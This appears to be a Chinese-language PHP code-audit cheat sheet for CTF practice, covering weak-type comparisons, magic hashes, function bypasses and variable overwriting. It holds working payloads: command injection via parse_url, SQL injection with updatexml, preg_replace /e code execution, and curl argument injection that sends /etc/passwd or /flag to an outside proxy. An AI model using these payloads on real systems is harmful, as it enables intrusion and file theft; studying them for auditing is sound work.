# **PHP代码审计备忘**
# **1. PHP弱类型问题**
## **int、String的转换**
```php
var_dump(intval(4))//4
var_dump(intval('1asd'))//1
var_dump(intval('asd1'))//0
intval（）函数在转换字符串的时候即使碰到不能转换的字符串的时候它也不会报错，而是返回0
```
## **比较操作符**
在编程中类型转换是不可避免的一个事情，比如说网络编程中get方法或者post方法传入一个需要转换成int的值，再比如说变量间进行比较的时候，需要将变量进行转换，鉴于php是自动进行类型转换，所以会引发很多意想不到的问题。
**“= =”与“= = =”比较操作符问题**
php有两种比较方式,一种是“= =”一种是“= = =”这两种都可以比较两个数字的大小，但是有很明显的区别。
* “= =”：会把两端变量类型转换成相同的，在进行比较。
* “= = =”：会先判断两端变量类型是否相同，在进行比较。<br>

这里明确说明，在两个相等的符号中，一个字符串与一个数字相比较时，字符串会转换成数值。
注意：在两个相等的符号中，一个字符串与一个数字相比较时，字符串会转换成数值
```php
<?php
         var_dump("name"==0);  //true
         var_dump("1name"==1); //true
         var_dump("name1"==1) //false
         var_dump("name1"==0) //true
         var_dump("0e123456"=="0e4456789"); //true
 ?>
 ```
* hash比较操作符问题
"0e123456"=="0e4456789"，当出现xex模式的时候代表科学计数法，2个数的值都是0因而就相等了<br>
```php
以下值在md5加密后以0E开头：
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
以下值在sha1加密后以0E开头：
sha1(‘aaroZmOk’)
sha1(‘aaK1STfY’)
sha1(‘aaO8zKZF’)
sha1(‘aa3OFF9m’)
```
* 十六进制转换问题<br>
"0x1e240"=="123456" //true<br>
"0x1e240"==123456 //true<br>
"0x1e240"=="1e240"//false<br>
php在接受一个带0x的字符串的时候，会自动把这行字符串解析成十进制的再进行比较，0x1e240解析成十进制就是123456，并且与字符串类型的123456和int型的123456都相同。
布尔值转换问题
```php
<?php
      If( true = "name"){
          echo "success";
}
```
布尔值可以和任何字符串相等。
## **利用数组绕过数值比较**
```php
$AA[]='admin';
if($AA < 9999999999){
    echo "hello world";
}
else if ((string)$AA>0) {
    echo 'A_A,too big';
}
if ((string)$AA == 0) {
    echo "ddddddddddd";
}
（1）无论你的数字多大，对于数值而言总是比数组小
（2）强制转化为字符串在与数字比较的判断，这就是平常操作很多的弱类型了，直接让参数等于admin就可以了，因为"admin"== 0 ，结果是true，直接等于0绕过即可, 即(string)$AA == 0成立
```
## **md5(array)==0**
```php
$value[] = 1;
var_dump(md5($value)); // NULL
var_dump(substr(md5($value),5,4)==0); // true
// md5()一个array返回null，null==0成立
```
## **总结**
* 1、字符串和数字比较，字符串会被转换成数字。<br>
* 2、混合字符串转换成数字，看字符串的第一个。<br>
* 3、字符串开头以xex开头，x代表数字。会被转换成科学计数法（注意一定要是0e/d+的模式）。但是也有例外如：-1.3e3转换为浮点数是-1300。<br>
* 4、0x开头的字符串会先解析成十六进制再进行比较<br>
* 5、布尔值跟任意字符串都弱类型相等<br>
# **2. PHP特定函数的使用绕过**
## **strcmp绕过**
```php
int strcmp ( string str1, string str1, string str2 ),
需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1
<?php
     $password="***************
     if(isset(\$_POST['password'])){
        if (strcmp(\$_POST['password'], \$password) == 0) {
            echo "Right!!!login success";n
            exit();
        } else {
            echo "Wrong password..";
        }
?>
我们传入password[]=xxx ，绕过成功。原理是因为函数接受到了不符合的类型，将发生错误，函数返回值为0，所以判断相等。
```
## **is_numeric()漏洞**
```php
php 5.x 版本中 is_numeric 的缺陷 (php7.0 已经修复了 ), 它认为 0x…. 是整数
比如：if(!is_numeric($page)){
		Die("sssssssssssssss   hacker hacker ");
	 }
如果是整数然后执行：$sql="update page set num=$page"; $res=mysql_my_query($sql);
可以将SQL注入语句转换为16进制
a='1 union all select flag,flag,flag,flag from flags' binascii.hexlify(a) ——> 3120756e696f6e20616c6c2073656c65637420666c61…….
传入page = 0x3120756…….即可绕过整数判断
```
## **in_array()**
功能 ：检查数组中是否存在某个值

定义 ： bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )

在 $haystack 中搜索 $needle ，如果第三个参数 $strict 的值为 TRUE ，则 in_array() 函数会进行强检查，检查 $needle 的类型是否和 $haystack 中的相同。如果找到 $haystack ，则返回 TRUE，否则返回 FALSE。

**案例**：判断 in_array(id，array(1,2,3,4)) // $strict未设置，以下payload默认强转为4，符合过滤条件，绕过
ID = 4 and (select updatexml(1,make_set(3,'~',(select flag from flag)),1))

## **filter_var ： (PHP 5 >= 5.2.0, PHP 7)**
功能 ：使用特定的过滤器过滤一个变量,如果成功，则返回已过滤的数据，如果失败，则返回 false。

定义 ：mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) 所以让我们先来绕过 filter_var 的 FILTER_VALIDATE_URL 过滤器，这里提供几个绕过方法，如下：

* http://localhost/index.php?url=http://demo.com@sec-redclub.com
* http://localhost/index.php?url=http://demo.com&sec-redclub.com
* http://localhost/index.php?url=http://demo.com?sec-redclub.com
* http://localhost/index.php?url=http://demo.com/sec-redclub.com
* http://localhost/index.php?url=demo://demo.com,sec-redclub.com
* http://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/
* http://localhost/index.php?url=http://demo.com#sec-redclub.com

PS:最后一个payload的#符号，请换成对应的url编码 %23

接着要绕过 **parse_url 函数**，并且满足 $site_info['host'] 的值以 sec-redclub.com 结尾，payload如下：

http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/

当我们直接用 cat f1agi3hEre.php 命令的时候，过不了 filter_var 函数检测，因为包含空格，具体payload如下：

http://localhost/index.php?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/

所以我们可以换成 cat<f1agi3hEre.php 命令，即可成功获取flag

## **escapeshellarg 和 escapeshellcmd**
escapeshellarg ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号。,<br>escapeshellcmd ，会对以下的字符进行转义&#;|*?~<>^()[]{}$, x0A 和 xFF, ' 和 "仅在不配对儿的时候被转义。

在字符串增加了引号同时会进行转义，那么之前的payload

http://127.0.0.1/index1.php?url=http://127.0.0.1' -T /etc/passwd

因为增加了 ' 进行了转义，所以整个字符串会被当成参数。注意 escapeshellcmd 的问题是在于如果 ' 和 " 仅在不配对儿的时候被转义。那么如果我们多增加一个 ' 就可以扰乱之前的转义了。如下：
```shell
http://127.0.0.1' -T /etc/passwd
http://baidu.com/' -F file=@/etc/passwd -x vps:9999
http://baidu.com/' -F file=@/var/www/html/flag.php -x vps:9999

传入的参数是
127.0.0.1' -v -d a=1
由于escapeshellarg先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：
'127.0.0.1'\'' -v -d a=1'
接着 escapeshellcmd 函数对第二步处理后字符串中的 \ 以及 a=1' 中的单引号进行转义处理，结果如下所示：
'127.0.0.1'\\'' -v -d a=1\'
```
例题：
```php
<?php
highlight_file(__FILE__);
function waf($a){
    foreach($a as $key => $value){
        if(preg_match('/flag/i',$key)){
            exit('are you a hacker');
        }
    }
}
foreach(array('_POST', '_GET', '_COOKIE') as $__R) {
    if($$__R) {
        var_dump($$__R);
        foreach($$__R as $__k => $__v) {
            if(isset($$__k) && $$__k == $__v) unset($$__k);
        }
    }
}
if($_POST) { waf($_POST);}
if($_GET) { waf($_GET); }
if($_COOKIE) { waf($_COOKIE);}

if($_POST) extract($_POST, EXTR_SKIP);
if($_GET) extract($_GET, EXTR_SKIP);
if(isset($_GET['flag'])){
    if($_GET['flag'] === $_GET['hongri']){
        exit('error');
    }
    if(md5($_GET['flag'] ) == md5($_GET['hongri'])){
        $url = $_GET['url'];
        $urlInfo = parse_url($url);
        if(!("http" === strtolower($urlInfo["scheme"]) || "https"===strtolower($urlInfo["scheme"]))){
            die( "scheme error!");
        }
        $url = escapeshellarg($url);
        $url = escapeshellcmd($url);
        system("curl ".$url);
    }
}
---------------------------------------------writeup----------------------------------------------------------
POST /ctf/code/escapeshell.php?flag=QNKCDZO&hongri=s878926199a&url=http://baidu.com/%27%20-F%20file=@/flag%20-x%20%20192.168.230.129:8888 HTTP/1.1
Host: 192.168.230.129
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=c18d5050ff3cd8412a328940
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 124

_GET[flag]=QNKCDZO&_GET[hongri]=s878926199a&_GET[url]=http://baidu.com/%27%20-F%20file=@/flag%20-x%20%20192.168.230.129:8888
```
## **parse_str**
功能 ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。

定义 ：void parse_str( string $encoded_string [, array &$result ] )

[a=1&b=2%26c=3]这样的提交时， $REQUEST 解析的内容就是 [a=1，b=2%26c=3] 。而通过上面代码的遍历进入 parse_str 函数的内容则是 [a=1&b=2&c=3] ，因为 parse_str 函数会针对传入进来的数据进行解码，所以解析后的内容就变成了[a=1，b=2，c=3]**

修复建议: 为了解决变量覆盖问题，可以在注册变量前先判断变量是否存在，如果使用 extract 函数可以配置第二个参数是 EXTR_SKIP 。使用 parse_str 函数之前先自行通过代码判断变量是否存在。
```php
<?php
$b = 1;
if(isset($b)){
   echo "b 已经存在";
} else {
   parse_str("b=3");
}
?>
```
## **preg_replace**
功能 ： 函数执行一个正则表达式的搜索和替换

定义 ： mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )

搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换

$pattern 存在 /e 模式修正符，允许代码执行

/e 模式修正符，是 *preg_replace() * 将 $replacement 当做php代码来执行
```php
preg_replace('/(.*)/ie',"\\1",'${phpinfo()}');
preg_replace('/(.*)/ie','strtolower("\\1")','{${phpinfo()}}')
preg_replace('/(.*)/ie','strtolower("{${phpinfo()}}")','{${phpinfo()}}')
preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value); // $regex = \S*, $value = {${phpinfo()}}
```
# **3. PHP遍历覆盖问题**
**\$\$这种写法称为可变变量:**<br>
一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。<br>
**extract()函数使用不当:**<br>
extract(array,extract_rules,prefix)<br>
该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量,该函数返回成功设置的变量数目。<br>
extract_rules： extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。可能的值：EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。<br>
**parse_str()函数使用不当**<br>
parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。<br>
parse_str('a=2');  //经过parse_str()函数后注册变量$a，重新赋值。<br>
**import_request_variables()使用不当**<br>
```php
bool import_request_variables(string$types[,string$prefix])
import_request_variables—将 GET／POST／Cookie 变量导入到全局作用域中
import_request_variables()函数就是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候
$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀
```
**案例：**
```php
highlight_file(__FILE__);
$_403 = "Access Denied";
$_200 = "Hello ~";
$a = 'morning';
$flag = 'flag{aef67s80-shug-kilh-juio-ertdgcbx67dhk}';
if ($_SERVER["REQUEST_METHOD"] != "POST"){
    die("please post!<br>");
} 
if (!isset($_POST["flag"])){
    die($_403);
}
foreach ($_GET as $key => $value)
    $$key = $$value;   
foreach ($_POST as $key => $value)
    $$key = $value;
if ($_POST["flag"] !== $flag ){
    die($_403);
}
else{
    $message = json_decode($_POST['json']);
    parse_str($message->token);
    if($a[0] != "aaroZmOk" && sha1($a[0]) == sha1('aaroZmOk')){
        if($message->theKey == 'a' && $message->theKey !== "a"){
            echo "This is your flag : ". $flag . "<br>";
            die($_200);
        }
    }
    else{
        echo "get out hacker !!!"."<br>";
    }
}
------------------------WriteUp-------------------------------
```
```html
POST /upctf/vulb.php?_200=flag HTTP/1.1
Host: www.test.com
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

flag=abc&a[0]=aa3OFF9m&json={"theKey":0e0,"token":"flag=_200"}
```